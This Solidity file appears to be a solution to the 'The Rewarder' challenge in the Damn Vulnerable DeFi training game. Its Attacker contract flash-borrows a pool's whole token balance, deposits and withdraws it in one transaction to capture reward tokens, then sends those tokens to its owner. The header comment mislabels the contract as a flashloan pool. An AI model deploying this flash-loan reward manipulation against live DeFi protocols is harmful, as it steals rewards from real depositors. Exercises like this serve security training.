// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract Attacker is Ownable {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool public immutable pool;
    TheRewarderPool public immutable rewarderPool;
    RewardToken public immutable rewardToken;

    constructor(address liquidityTokenAddress, address _poolAddress, address _rewarderPoolAddress, address _rewardTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        pool = FlashLoanerPool(_poolAddress);
        rewarderPool = TheRewarderPool(_rewarderPoolAddress);
        rewardToken = RewardToken(_rewardTokenAddress);
    }

    function initAttack() external onlyOwner {
        uint256 poolBalance = liquidityToken.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
        
        bool success = rewardToken.transfer(this.owner(), rewardToken.balanceOf(address(this)));
        require(success, "Reward not sent");
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(pool), "Only pool");

        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);


        bool success = liquidityToken.transfer(address(pool), amount);

        require(success, "FL not paid back");
    }
}
